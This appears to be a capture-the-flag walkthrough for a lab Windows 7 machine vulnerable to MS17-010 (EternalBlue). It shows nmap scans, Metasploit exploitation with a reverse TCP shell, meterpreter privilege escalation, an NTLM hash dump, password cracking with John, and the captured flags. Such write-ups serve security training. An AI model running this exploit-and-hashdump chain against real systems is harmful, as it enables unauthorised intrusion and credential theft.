# Eternal Blue

- [Enumeration](#enumeration)
  - [Full NMAP](#nmap-full-scan)
  - [Vuln Nmap](#nmap-vuln-scan)
- [Initial Access](#initial-access)

# Enumeration

## Nmap Full Scan

```bash
# Nmap 7.60 scan initiated Wed May 12 18:23:56 2021 as: nmap -Pn -sV -sC -v -A -oN blue/nmap/blue 10.10.150.203
Nmap scan report for ip-10-10-150-203.eu-west-1.compute.internal (10.10.150.203)
Host is up (0.00097s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server Microsoft Terminal Service
| ssl-cert: Subject: commonName=Jon-PC
| Issuer: commonName=Jon-PC
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2021-05-11T17:19:29
| Not valid after:  2021-11-10T17:19:29
| MD5:   9f73 e827 b721 b139 31e0 d0e4 05be acb5
|_SHA-1: fa1d f3b8 2e4d fb9c cddd 2635 8656 c3ea d583 e6fa
|_ssl-date: 2021-05-12T17:26:09+00:00; 0s from scanner time.
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49158/tcp open  msrpc         Microsoft Windows RPC
49159/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 02:6F:D4:29:BC:1B (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.60%E=4%D=5/12%OT=135%CT=1%CU=31493%PV=Y%DS=1%DC=D%G=Y%M=026FD4%
OS:TM=609C0FB6%P=x86_64-pc-linux-gnu)SEQ(SP=FB%GCD=1%ISR=10F%TI=I%CI=I%TS=7
OS:)SEQ(SP=FB%GCD=1%ISR=10F%TI=I%CI=RD%II=I%SS=S%TS=7)OPS(O1=M2301NW8ST11%O
OS:2=M2301NW8ST11%O3=M2301NW8NNT11%O4=M2301NW8ST11%O5=M2301NW8ST11%O6=M2301
OS:ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)ECN(R=Y%DF=Y%T=
OS:80%W=2000%O=M2301NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T
OS:2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O
OS:%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y
OS:%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%R
OS:D=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IP
OS:L=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Uptime guess: 0.005 days (since Wed May 12 18:18:22 2021)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=251 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:6f:d4:29:bc:1b (unknown)
| Names:
|   JON-PC<00>           Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   JON-PC<20>           Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|_  \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
| smb-os-discovery:
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Jon-PC
|   NetBIOS computer name: JON-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-05-12T12:26:09-05:00
| smb-security-mode:
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-05-12 18:26:09
|_  start_date: 2021-05-12 18:19:25

TRACEROUTE
HOP RTT     ADDRESS
1   0.97 ms ip-10-10-150-203.eu-west-1.compute.internal (10.10.150.203)

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed May 12 18:26:14 2021 -- 1 IP address (1 host up) scanned in 138.65 seconds

```

## Nmap Vuln Scan

```bash
# Nmap 7.60 scan initiated Wed May 12 18:39:03 2021 as: nmap -p 0-1000 --script vuln -Pn -sV -sC -v -A -oN blue-vuln 10.10.150.203
Nmap scan report for ip-10-10-150-203.eu-west-1.compute.internal (10.10.150.203)
Host is up (0.00047s latency).
Not shown: 998 closed ports
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
MAC Address: 02:6F:D4:29:BC:1B (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.60%E=4%D=5/12%OT=135%CT=1%CU=32322%PV=Y%DS=1%DC=D%G=Y%M=026FD4%
OS:TM=609C131A%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=104%TI=I%CI=I%TS=
OS:7)SEQ(SP=102%GCD=1%ISR=104%TI=I%CI=I%II=I%SS=S%TS=7)SEQ(SP=102%GCD=1%ISR
OS:=104%TI=I%TS=7)OPS(O1=M2301NW8ST11%O2=M2301NW8ST11%O3=M2301NW8NNT11%O4=M
OS:2301NW8ST11%O5=M2301NW8ST11%O6=M2301ST11)WIN(W1=2000%W2=2000%W3=2000%W4=
OS:2000%W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M2301NW8NNS%CC=N%Q=)T1(R
OS:=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%
OS:RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=
OS:0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T
OS:6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+
OS:%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK
OS:=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Uptime guess: 0.016 days (since Wed May 12 18:18:22 2021)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

TRACEROUTE
HOP RTT     ADDRESS
1   0.47 ms ip-10-10-150-203.eu-west-1.compute.internal (10.10.150.203)

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed May 12 18:40:42 2021 -- 1 IP address (1 host up) scanned in 99.28 seconds
```

# Initial Access

## Metasploit

```bash
$ msfconsole

msf5> search ms17-010
msf5> use exploit/windows/smb/ms17_010_eternalblue
msf5> exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/shell/reverse_tcp
msf5> set RHOST 10.10.x.x
msf5> run
.
.
.
C:\Windows\system32> whoami
nt authority/system

```

# Escalate

- We have a shell, now lets upgrade it to a meterpreter shell.

1. Background the shell
   ```bash
   CTRL-Z
   Background session 1 (y/N)?
   msf5>
   ```
1. search for the upgrade module _shell_to_meterpreter_

   ```bash
   msf5> search shell_to_meterpreter
   msf5> use post/multi/manage/shell_to_meterpreter
   msf5> set SESSION 1
   ```

1. If this was successful, we should see a second session available

   ```bash
   mas5> sessions
   1...
   2...
   ```

1. Now. lets use that session

   ```bash
   msf5> sessions -i 2
   meterpreter> getsystem
   meterpreter > getsystem
   ...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
   meterpreter > shell
   Process 1476 created.
   Channel 1 created.
   Microsoft Windows [Version 6.1.7601]
   Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

   C:\Windows\system32>whoami
   whoami
   nt authority\system

   C:\Windows\system32>
   ```

1. List the processess running with the ps command. Just because we are system doesn't mean our precess is. Locate the process towards the bottom of this list where NT AUTHORITY/SYSTEM and write down the process id in the far left column

   ```bash
   2912  2180  powershell.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
   ```

1. Migrate to this process. This may take several attempts because this process is not very stable. If it fails, we may need to re-run the conversion process or reboot the machine and start again with another process.
   ```bash
   migrate PROCESS_ID
   ```

# Cracking

- Dump the non-default user's password and crack it!

1. With our elevated meterpreter shell, we can run _hashdump_ which will dump all of the passwords on the machine as long as we have the correct privileges to do so.
   ```bash
   meterpreter> hashdump
   Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
   Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
   Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
   ```
1. Crack these hashes with John via Metasploit

   ```bash
   meterpreter> background
   msf5> search hash
   post/windows/gather/hashdump
   msf5> use post/windows/gather/hashdump
   msf5> options
   msf5 post(windows/gather/hashdump) > set session 2
   session => 2
   msf5 post(windows/gather/hashdump) > run
    [*] Obtaining the boot key...
    [*] Calculating the hboot key using SYSKEY 55bd17830e678f18a3110daf2c17d4c7...
    [*] Obtaining the user list and keys...
    [*] Decrypting user keys...
    [*] Dumping password hints...

    Jon:"Nah boi, I ain't sharing nutting with you"

    [*] Dumping password hashes...

    Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::

    [*] Post module execution completed
    msf5 post(windows/gather/hashdump) > creds
    Credentials
    ===========

    host origin service public private realm private_type JtR Format

    ---

    10.10.150.203 10.10.150.203 445/tcp (smb) administrator aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 NTLM hash nt,lm
    10.10.150.203 10.10.150.203 445/tcp (smb) guest aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 NTLM hash nt,lm
    10.10.150.203 10.10.150.203 445/tcp (smb) jon aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d NTLM hash nt,lm
   ```

1. Save the Jon hash into a file. We will use JTR to crack it
   ```bash
   john jon.hash --format=NT --wordlist=/usr/share/wordlists/rockyou.txt
   Using default input encoding: UTF-8
   Loaded 1 password hash (NT [MD4 256/256 AVX2 8x3])
   Warning: no OpenMP support for this hash type, consider --fork=2
   Press 'q' or Ctrl-C to abort, almost any other key for status
   alqfna22         (Jon)
   1g 0:00:00:07 DONE (2021-05-12 19:47) 0.1253g/s 1278Kp/s 1278Kc/s 1278KC/s alr1979..alpus
   Use the "--show --format=NT" options to display all of the cracked passwords reliably
   Session completed.
   ```
1. Flag1? This flag can be found at the system root.

   ```bash
   c: type flag1.txt
   flag{access_the_machine}
   ```

1. Flag2? This flag can be found at the location where passwords are stored within Windows.

   - This is where the SAM file lives. Where all of the passwords are stored in the system.

   ```bash
   Directory of C:\Windows\System32\config

   05/12/2021  12:20 PM    <DIR>          .
   05/12/2021  12:20 PM    <DIR>          ..
   12/12/2018  06:00 PM            28,672 BCD-Template
   05/12/2021  12:29 PM        18,087,936 COMPONENTS
   05/12/2021  12:49 PM           262,144 DEFAULT
   03/17/2019  02:32 PM                34 flag2.txt
   07/13/2009  09:34 PM    <DIR>          Journal
   05/12/2021  12:49 PM    <DIR>          RegBack
   03/17/2019  03:05 PM           262,144 SAM
   05/12/2021  12:29 PM           262,144 SECURITY
   05/12/2021  01:03 PM        40,632,320 SOFTWARE
   05/12/2021  01:52 PM        12,582,912 SYSTEM
   11/20/2010  09:41 PM    <DIR>          systemprofile
   12/12/2018  06:03 PM    <DIR>          TxR
               8 File(s)     72,118,306 bytes
               6 Dir(s)  20,454,395,904 bytes free

   C:\Windows\System32\config>type flag2.txt
   type flag2.txt
   flag{sam_database_elevated_access}
   ```

1. This one is in a pretty standard location

   ```bash
   C:\Users\Jon\Documents>dir
   dir
   Volume in drive C has no label.
   Volume Serial Number is E611-0B66

   Directory of C:\Users\Jon\Documents

   12/12/2018  10:49 PM    <DIR>          .
   12/12/2018  10:49 PM    <DIR>          ..
   03/17/2019  02:26 PM                37 flag3.txt
               1 File(s)             37 bytes
               2 Dir(s)  20,454,395,904 bytes free

   C:\Users\Jon\Documents>type flag3.txt
   type flag3.txt
   flag{admin_documents_can_be_valuable}
   ```
